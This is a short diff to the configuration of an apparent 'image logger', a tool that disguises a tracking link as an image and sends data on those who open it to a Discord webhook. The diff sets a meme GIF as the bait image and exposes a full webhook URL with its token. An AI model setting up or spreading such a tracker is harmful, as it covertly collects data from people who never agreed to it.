@@ -13,7 +13,7 @@ __author__ = "Rahand"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1403034711357521951/3ENMQHsXdrmRF4y_bD0khVkPIGlQfz2moJzub5sudmCq73Kj-7gnO66_9ax92YuoUoo0",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "_zWYqfZdneIAAAAM/shocked-face-shocked-meme.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
